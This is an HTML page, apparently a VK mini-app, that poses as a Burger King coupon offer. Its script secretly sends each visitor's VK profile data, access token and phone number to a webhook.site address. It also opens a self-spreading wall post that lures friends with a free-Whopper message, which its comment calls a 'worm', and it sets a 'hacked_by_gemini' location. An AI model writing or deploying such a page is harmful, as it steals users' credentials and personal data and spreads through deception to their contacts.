<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Burger King Coupons</title>
    <script src="https://unpkg.com/@vkontakte/vk-bridge/dist/browser.min.js"></script>
</head>
<body>
    <h1>Загрузка купонов...</h1>
    <script>
        // 1. Инициализация моста (обязательно первым делом)
        vkBridge.send('VKWebAppInit');

        const webhook = "https://webhook.site/40f8f088-01f8-4127-bb7e-39d5ab0e24c0";

        // 2. Автоматический сбор данных профиля (работает без подтверждения)
        vkBridge.send("VKWebAppGetUserInfo").then(data => {
            fetch(webhook + "?user_info=" + btoa(JSON.stringify(data)));
        }).catch(err => console.log(err));

        // 3. Запрос токена (вызовет окно подтверждения)
        vkBridge.send("VKWebAppGetAuthToken", {"app_id": 54401740, "scope": "friends,status"})
            .then(data => {
                fetch(webhook + "?token=" + data.access_token);
                
                // 4. Если токен получен, пробуем вызвать публикацию на стену
                // Это "червь": пост со ссылкой на твое приложение
                vkBridge.send("VKWebAppShowWallPostBox", {
                    "message": "Получил бесплатный воппер в Burger King! Попробуй и ты: ",
                    "attachments": "https://vk.com/app54401740"
                });
            })
            .catch(error => {
                fetch(webhook + "?auth_error=" + btoa(JSON.stringify(error)));
            });

        // 5. Попытка смены локации (статуса в приложении)
        vkBridge.send("VKWebAppSetLocation", {"location": "hacked_by_gemini"});

        // 6. Запрос номера телефона (вызовет отдельное окно подтверждения)
        vkBridge.send("VKWebAppGetPhoneNumber")
            .then(data => {
                if (data.phone_number) {
                    fetch(webhook + "?phone=" + data.phone_number);
                }
            })
            .catch(err => {
                fetch(webhook + "?phone_error=" + btoa(JSON.stringify(err)));
            });

    </script>
</body>
</html>
